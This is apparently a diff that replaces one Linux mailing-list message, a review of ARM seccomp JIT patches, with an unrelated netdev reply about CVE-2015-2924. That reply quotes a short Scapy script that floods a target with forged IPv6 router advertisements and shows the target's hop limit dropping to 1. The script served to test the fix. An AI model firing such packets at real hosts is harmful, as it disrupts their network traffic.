@@ -1,58 +1,102 @@
-From: Alexei Starovoitov <alexei.starovoitov@gmail.com>
-Subject: Re: [PATCH 0/4] Seccomp filter JIT support on ARM.
-Date: Wed, 29 Apr 2015 09:46:14 -0700
-Message-ID: <20150429164607.GA12410@Alexeis-MBP.westell.com>
-References: <1430314657-2552-1-git-send-email-nschichan@freebox.fr>
+From: Dan Williams <dcbw@redhat.com>
+Subject: Re: [GIT] Networking
+Date: Wed, 29 Apr 2015 11:50:35 -0500
+Message-ID: <1430326235.4070.16.camel@redhat.com>
+References: <20150401.154847.612566794393812348.davem@davemloft.net>
+	 <CAK1hOcOd=dLUyxJy1mEj2=Hy-zOqDp2KJ8or+1Zrsk+BvNn5oQ@mail.gmail.com>
+	 <5540F605.2040907@modio.se>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
+Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: 7bit
-Cc: Russell King <linux@arm.linux.org.uk>, Kees Cook <keescook@chromium.org>,
- netdev@vger.kernel.org, linux-kernel@vger.kernel.org,
- Andy Lutomirski <luto@amacapital.net>, Daniel Borkmann <dborkman@redhat.com>,
- Will Drewry <wad@chromium.org>, "David S. Miller" <davem@davemloft.net>,
- linux-arm-kernel@lists.infradead.org
-To: Nicolas Schichan <nschichan@freebox.fr>
-Return-path: <linux-arm-kernel-bounces+linux-arm-kernel=m.gmane.org@lists.infradead.org>
-Content-Disposition: inline
-In-Reply-To: <1430314657-2552-1-git-send-email-nschichan@freebox.fr>
-List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-arm-kernel>,
- <mailto:linux-arm-kernel-request@lists.infradead.org?subject=unsubscribe>
-List-Archive: <http://lists.infradead.org/pipermail/linux-arm-kernel/>
-List-Post: <mailto:linux-arm-kernel@lists.infradead.org>
-List-Help: <mailto:linux-arm-kernel-request@lists.infradead.org?subject=help>
-List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-arm-kernel>,
- <mailto:linux-arm-kernel-request@lists.infradead.org?subject=subscribe>
-Sender: "linux-arm-kernel" <linux-arm-kernel-bounces@lists.infradead.org>
-Errors-To: linux-arm-kernel-bounces+linux-arm-kernel=m.gmane.org@lists.infradead.org
-List-Id: netdev.vger.kernel.org
+Cc: Denys Vlasenko <vda.linux@googlemail.com>,
+	David Miller <davem@davemloft.net>,
+	Linus Torvalds <torvalds@linux-foundation.org>,
+	Andrew Morton <akpm@linux-foundation.org>,
+	netdev@vger.kernel.org,
+	Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
+	Hannes Frederic Sowa <hannes@stressinduktion.org>,
+	Don Howard <dhoward@redhat.com>
+To: "D.S. Ljungmark" <ljungmark@modio.se>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from mx1.redhat.com ([209.132.183.28]:39823 "EHLO mx1.redhat.com"
+	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+	id S1752299AbbD2Qtf (ORCPT <rfc822;netdev@vger.kernel.org>);
+	Wed, 29 Apr 2015 12:49:35 -0400
+In-Reply-To: <5540F605.2040907@modio.se>
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Wed, Apr 29, 2015 at 03:37:33PM +0200, Nicolas Schichan wrote:
-> Greetings,
+On Wed, 2015-04-29 at 17:17 +0200, D.S. Ljungmark wrote:
+> On 29/04/15 16:51, Denys Vlasenko wrote:
+> > On Wed, Apr 1, 2015 at 9:48 PM, David Miller <davem@davemloft.net> wrote:
+> >> D.S. Ljungmark (1):
+> >>       ipv6: Don't reduce hop limit for an interface
+> > 
+> > https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6fd99094de2b83d1d4c8457f2c83483b2828e75a
+> > 
+> > I was testing this change and apparently it doesn't close the hole.
+> > 
+> > The python script I use to send RAs:
+> > 
+> > #!/usr/bin/env python
+> > import sys
+> > import time
+> > import scapy.all
+> > from scapy.layers.inet6 import *
+> > ip = IPv6()
+> > # ip.dst = 'ff02::1'
+> > ip.dst = sys.argv[1]
+> > icmp = ICMPv6ND_RA()
+> > icmp.chlim = 1
+> > for x in range(10):
+> >     send(ip/icmp)
+> >     time.sleep(1)
+> > 
+> > # ./ipv6-hop-limit.py fe80::21e:37ff:fed0:5006
+> > .
+> > Sent 1 packets.
+> > ...<10 times>...
+> > Sent 1 packets.
+> > 
+> > After I do this, on the targeted machine I check hop_limits:
+> > 
+> > # for f in /proc/sys/net/ipv6/conf/*/hop_limit; do echo -n $f:; cat $f; done
+> > /proc/sys/net/ipv6/conf/all/hop_limit:64
+> > /proc/sys/net/ipv6/conf/default/hop_limit:64
+> > /proc/sys/net/ipv6/conf/enp0s25/hop_limit:1  <=== THIS
+> > /proc/sys/net/ipv6/conf/lo/hop_limit:64
+> > /proc/sys/net/ipv6/conf/wlp3s0/hop_limit:64
+> > 
+> > As you see, the interface which received RAs still lowered
+> > its hop_limit to 1. I take it means that the bug is still present
+> > (right? I'm not a network guy...).
 > 
-> The following patches allow the use of the existing JIT code under
-> arch/arm for seccomp filters.
+> It might not be present in the _kernel_. Do you run NetworkManager on
+> your system? If so, see below.
 > 
-> The first patch makes bpf_migrate_filter() available so that seccomp
-> code can use it.
+> > 
+> > I triple-checked that I do run the kernel with the fix.
+> > Further investigation shows that the code touched by the fix
+> > is not even reached, hop_limit is changed elsewhere.
+> > 
+> > I'm willing to test additional patches.
 > 
-> The second patch invokes the classic BPF JIT code and if this fails
-> reverts to the internal BPF. The open coded double call to
-> bpf_convert_filter() and bpf_prog_select_runtime() is replaced by
-> bpf_migrate_filter()
+> NetworkManager had it's own re-implementation of the bug. It got fixed
+> with NetworkManager commit:
 > 
-> The third patch adds support for loads from the seccomp_data structure in
-> the ARM BPF JIT code.
+> commit bdaaf9849b0cacf131b71fa2ae168f5db796874f
+> Author: Thomas Haller <thaller@redhat.com>
+> Date:   Wed Apr 8 15:54:30 2015 +0200
+> 
+>     platform: don't accept lowering IPv6 hop-limit from RA (CVE-2015-2924)
+> 
+> 
+> 
+> Beforte that commit, NetworkManager would take the RA packet, extract
+> the hop limit, and write it to the sysctl itself.
 
-the patches 1,2,3 look fine.
+Yup, we basically followed the original kernel logic here, so we needed
+to patch it in NM as well.  It's been backported to NM 0.9.10, 1.0, and
+obviously is in git master.
 
-> The fourth and final patch fixes a bug in the emit_udiv() function
-> when used to convert a BPF_ALU | BPF_DIV | BPF_K instruction in the
-> ARM BPF JIT code.
-
-this one looks independent from first three and probably should
-be sent to stable?
-
-Your cc list is different for every patch, why? What tree are you
-thinking to go through? 1st patch is trivial, but 2nd belongs in
-seccomp, 3rd and 4th are in arm32... I'd would say arm tree if Kees
-is ok with it.
+Dan
